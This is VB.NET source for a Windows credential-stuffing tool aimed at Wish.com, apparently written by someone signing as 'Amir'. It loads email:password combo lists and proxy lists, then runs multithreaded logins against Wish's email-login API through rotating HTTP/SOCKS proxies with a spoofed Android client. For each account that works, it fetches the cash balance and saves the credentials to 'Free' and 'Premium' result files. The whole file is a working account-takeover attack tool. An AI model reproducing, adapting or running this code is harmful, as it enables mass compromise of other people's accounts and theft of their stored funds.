Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Resources
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports xNet

Public Class Form1

    Inherits MetroFramework.Forms.MetroForm
    Public string_0 As String()

    Public int_0 As Integer

    Public bool_0 As Boolean

    Public int_1 As Integer

    Public free As Integer

    Public total As Integer

    Public wi As Integer



    Public int_2 As Integer

    Public string_1 As String

    Public string_2 As String

    Public string_3 As String

    Public string_4 As String

    Public int_3 As Integer

    Public int_4 As Integer

    Public int_5 As Integer

    Public string_5 As String()

    Public queue_0 As Queue

    Public string_6 As String()

    Public object_0 As Object

    Private label_0 As Label

    Public string_7 As String()

    Public proxyType_0 As ProxyType

    Public random_0 As Random

    Private button_0 As Button

    Public thread_0 As Thread()

    Public int_6 As Integer

    Public int_7 As Integer

    Public int_8 As Integer

    Public int_11 As Integer

    Public int_12 As Integer

    Public int_13 As Integer

    Public int_14 As Integer

    Public int_15 As Integer

    Public int_16 As Integer

    Public int_17 As Integer

    Public good As Integer

    Public bad As Integer

    Public err As Integer

    Public remin As Integer

    ' Public free As Integer

    Public string_8 As String

    Public string_9 As String

    Public string_10 As String

    Public string_11 As String

    Private string_12 As String

    Private string_13 As String

    Public object_1 As Object

    Public string_14 As String

    Public a1 As Integer

    Public a2 As Integer

    Public a3 As Integer

    Public a4 As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim s As New HttpRequest

        Dim r As String = s.Get("https://docs.google.com/document/d/1r6iuvZWTOWqUWtm8ZM3ETVfunsaMz7zVsobRxrTDtrM/edit?usp=sharing").ToString

        If r.Contains("on") Then


            If (Not System.IO.Directory.Exists(String.Concat(Application.StartupPath, "\Results"))) Then
                System.IO.Directory.CreateDirectory(String.Concat(Application.StartupPath, "\Results"))
            End If




            MetroComboBox1.SelectedIndex = 0

        Else

            End

        End If
    End Sub

    Private Sub MetroButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Тext Files|*.txt"
            If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
                Dim chrArray() As Char = {Strings.ChrW(10)}
                Me.string_6 = File.ReadAllText(openFileDialog.FileName).Trim().TrimEnd(New Char(-1) {}).Replace(";", ":").Split(chrArray).Distinct().ToArray()
                Me.int_3 = CInt(Me.string_6.Length)
                Me.int_8 = Me.int_3

                '  Me.remin.Text = Me.int_3.ToString()
                MetroButton1.Text = String.Concat("Loaded Combo: ", Me.int_3.ToString())
                Label3.Text = "Remain : " & Me.int_3.ToString()

                remin = Me.int_3

            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub MetroButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton2.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Text Files|*.txt"
            If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
                Me.string_7 = File.ReadAllLines(openFileDialog.FileName).Distinct().ToArray()
                Me.int_4 = CInt(Me.string_7.Length)
                MetroButton2.Text = String.Concat("Loaded Proxy: ", Me.int_4.ToString())
                '   Label13.Text = Me.int_4.ToString()
            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub MetroButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton3.Click
        a1 = 0
        a2 = 0
        a3 = 0
        a4 = 0
        bad = 0
        err = 0
        good = 0
        Me.int_11 = 0
        Me.int_12 = 0
        Me.int_13 = 0
        Me.int_14 = 0
        Me.int_15 = 0
        Me.int_16 = 0
        Me.int_17 = 0


        Me.string_13 = DateTime.Now.ToString("dd-MM-yy HH-mm-ss")
        Me.string_12 = String.Concat("Results\Result ", Me.string_13)
        If (Me.int_3 = 0) Then
            Interaction.MsgBox("Please Load Combo !.", MsgBoxStyle.Exclamation, Nothing)
        ElseIf (Me.int_4 = 0) Then
            Interaction.MsgBox("Please Load Proxy !. ", MsgBoxStyle.Exclamation, Nothing)
        Else
            Me.int_2 = 0
            Me.int_1 = 0
            Me.string_5 = Nothing
            Me.string_0 = Nothing
            Me.int_6 = 0
            Me.int_7 = 0
            Me.int_8 = Me.int_3
            MetroButton1.Enabled = False
            NumericUpDown1.Enabled = False
            CheckBox1.Enabled = False
            MetroButton2.Enabled = False
            MetroButton3.Enabled = False
            '  CheckBox1.Enabled = False
            MetroButton4.Enabled = True
            Me.queue_0 = New Queue()
            Directory.CreateDirectory(Me.string_12)
            Dim int3 As Integer = Me.int_3 - 1
            Dim num As Integer = 0
            Do
                Me.queue_0.Enqueue(Me.string_6(num))
                num = num + 1
            Loop While num <= int3
            Me.int_5 = Convert.ToInt32(Me.NumericUpDown1.Value)
            ReDim Me.thread_0(Me.int_5 - 1 + 1 - 1)
            Dim int5 As Integer = Me.int_5 - 1
            Dim num1 As Integer = 0
            Do
                Dim form1 As Form1 = Me
                Me.thread_0(num1) = New Thread(New ThreadStart(AddressOf form1.method_3))
                Me.thread_0(num1).IsBackground = True
                Me.thread_0(num1).Start()
                num1 = num1 + 1
            Loop While num1 <= int5
            Me.Timer1.Enabled = True
            Me.bool_0 = True
            Me.MetroListView1.Items.Clear()
        End If
    End Sub

    Public Sub New()
        MyBase.New()
        Dim form11 As Form1 = Me
        AddHandler MyBase.Load, New EventHandler(AddressOf form11.Form1_Load)
        ReDim Me.string_0(-1)
        Me.int_0 = 0
        ReDim Me.string_5(-1)
        Me.object_0 = RuntimeHelpers.GetObjectValue(New Object())
        Me.random_0 = New Random()
        Me.InitializeComponent()
        Control.CheckForIllegalCrossThreadCalls = False
        Me.object_1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(New Object())))
    End Sub

    Private Sub method_3()

        Dim proxyse As String = Me.string_7(Me.random_0.[Next](0, Me.int_4))
        Dim objectValue As Object = Nothing
        Dim str As String = Nothing
        Dim chrArray As Char()
        Dim string7 As String = Me.string_7(Me.random_0.[Next](0, Me.int_4))
        While Me.queue_0.Count <> 0
            Dim obj As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.object_0)))
            ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(obj))
            Dim objectValue1 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.object_1)))
            Dim flag As Boolean = False
            Try
                Dim obj1 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue1)))
                objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj1)))
                Monitor.Enter(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj1))), flag)
                Try
                    Dim str1 As String = Me.queue_0.Peek().ToString()
                    chrArray = New Char() {Strings.ChrW(13)}
                    str = str1.TrimEnd(chrArray).Trim()
                    Me.queue_0.Dequeue()
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    ProjectData.SetProjectError(exception)
                    ProjectData.ClearProjectError()
                    ProjectData.ClearProjectError()
                End Try
            Finally
                If (flag) Then
                    Monitor.[Exit](RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))))
                End If
            End Try
            Try


                Dim separator As String = ":"
                Dim split = str.Split(separator, 2, StringSplitOptions.RemoveEmptyEntries)
                Dim accemail As String = split(0)
                Dim accpassword As String = split(1)

                If accpassword = Nothing Then
                    err = err + 1
                    Me.queue_0.Enqueue(str)
                End If

                Dim s As New HttpRequest






                If MetroComboBox1.SelectedIndex = 0 Then

                    proxyType_0 = ProxyType.Http

                ElseIf MetroComboBox1.SelectedIndex = 1 Then

                    proxyType_0 = ProxyType.Socks4

                ElseIf MetroComboBox1.SelectedIndex = 2 Then

                    proxyType_0 = ProxyType.Socks5

                End If


                s.Proxy = ProxyClient.Parse(proxyType_0, proxyse)
                s.UserAgent = "Mozilla/5.0 (Linux; Android 5.1.1; A5010 Build/LMY48Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Safari/537.36"
                s.AddHeader("Cookie", "_xsrf=1; _appLocale=en_US; bsid=99aad92b9d0aac35e2cfeeccc60bd29e; _timezone=8.0; _timezone_id=Asia/Shanghai")
                Dim rep As HttpResponse = s.Post("https://www.wish.com/api/email-login", "email=" & accemail & "&password=" & accpassword & "&session_refresh=false&app_referrer=utm_source%3Dgoogle-play%26utm_medium%3Dorganic&app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C179%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C194%2C197%2C198%2C199&_app_type=wish&_riskified_session_token=12ece64a-d12a-4ba9-827d-812a99b8b7f5&_threat_metrix_session_token=7625-877c10b6-40f7-43d7-8a04-959242172571&advertiser_id=6c708824-4ac1-429f-913f-715cc6db3f4c&_version=4.35.5&app_device_model=A5010", "application/x-www-form-urlencoded")




                Dim bsid As String = rep.GetRawCookie("bsid").Substring("=", ";")
                Dim ss As String = rep.GetRawCookie("sweeper_session").Substring("=", ";").Replace("""", "")
                Dim vut As String = rep.GetRawCookie("vendor_user_tracker").Substring("=", ";")


                s.AllowAutoRedirect = True
                s.IgnoreProtocolErrors = True
                s.AddHeader("Cookie", "_xsrf=1; _appLocale=en_US; bsid=" & bsid & "; sweeper_session=" & ss & "; vendor_user_tracker=" & vut & "; _timezone=8.0; _timezone_id=Asia/Shanghai")
                Dim rep2 As String = s.Post("https://www.wish.com/api/commerce-cash-data/get", "app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C179%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C194%2C197%2C198%2C199&_app_type=wish&_riskified_session_token=12ece64a-d12a-4ba9-827d-812a99b8b7f5&_threat_metrix_session_token=7625-877c10b6-40f7-43d7-8a04-959242172571&advertiser_id=6c708824-4ac1-429f-913f-715cc6db3f4c&_version=4.35.5&app_device_model=A5010", "application/x-www-form-urlencoded").ToString



                Dim crr As String = rep2.Substring("currency_code"": """, """}")
                Dim money As String = rep2.Substring("""}, ""amount"":", ", ""symbol"":")

                good = good + 1

                If money <= 0 Then
                    free = free + 1

                End If

                If money >= 0 And money <= 10 Then
                    a1 = a1 + 1
                End If

                If money > 10 And money <= 50 Then
                    a2 = a2 + 1
                End If

                If money > 50 And money <= 100 Then
                    a3 = a3 + 1

                End If

                If money > 100 Then
                    a4 = a4 + 1
                End If


                If CheckBox1.CheckState = True Then




                    Dim newItem As New ListViewItem(str)

                    newItem.SubItems.Add(money & crr)

                    newItem.SubItems.Add(proxyse)

                    MetroListView1.Items.Add(newItem)



                Else
                    If money <= 0 Then
                        Return

                    End If

                    Dim newItem As New ListViewItem(str)

                    newItem.SubItems.Add(money & crr)

                    newItem.SubItems.Add(proxyse)

                    MetroListView1.Items.Add(newItem)

                End If




                If money <= 0 Then


                    File.AppendAllText(String.Concat(Me.string_12, "\Free_Accounts.txt"), String.Concat("-------[By-Amir]-------" & vbNewLine & vbNewLine & "Combo : " & accemail & ":" & accpassword & vbNewLine & "Money (Cash) : " & money & " " & crr & vbNewLine & "Proxy : " & proxyse & vbNewLine & vbNewLine & "-------[By-Amir]-------" & vbNewLine & vbNewLine))
                End If

                If money > 0 Then

                    File.AppendAllText(String.Concat(Me.string_12, "\Premium_Accounts.txt"), String.Concat("-------[By-Amir]-------" & vbNewLine & vbNewLine & "Combo : " & accemail & ":" & accpassword & vbNewLine & "Money (Cash) : " & money & " " & crr & vbNewLine & "Proxy : " & proxyse & vbNewLine & vbNewLine & "-------[By-Amir]-------" & vbNewLine & vbNewLine))

                End If

            Catch ex As Exception

                If ex.Message.Contains("Ошибка на стороне клиента. Код состояния: 400") Then

                    bad = bad + 1
                    Me.queue_0.Enqueue(str)

                Else

                    err = err + 1
                    proxyse = Me.string_7(Me.random_0.[Next](0, Me.int_4))

                End If
            End Try


            If (Me.int_8 <= 0) Then
                Me.Timer1.[Stop]()
            End If

        End While

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Label3.Text = "Remain : " & remin
        Label4.Text = "Hits : " & good
        Label5.Text = "Free : " & free
        Label8.Text = "Bad : " & bad
        Label9.Text = "Errors : " & err
        Label7.Text = "[0-10] : " & a1
        Label10.Text = "[10-50] : " & a2
        Label11.Text = "[50-100] : " & a3
        Label12.Text = "[+100] : " & a4

        If remin <= 0 Then
            Process.Start(String.Concat(Application.StartupPath, "\Results"), Conversions.ToString(1))
            Timer1.Stop()
            End
        End If
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Process.Start("https://www.facebook.com/By.Amir.Dev/")
        Process.Start("https://www.facebook.com/profile.php?id=100042007631935")

    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        Process.Start("https://www.facebook.com/By.Amir.Dev/")
        Process.Start("https://www.facebook.com/profile.php?id=100042007631935")
    End Sub

    Private Sub MetroButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton4.Click
        Process.Start(String.Concat(Application.StartupPath, "\Results"), Conversions.ToString(1))
    End Sub

    Private Sub MetroButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton5.Click
        Timer1.Stop()
        End
    End Sub
End Class
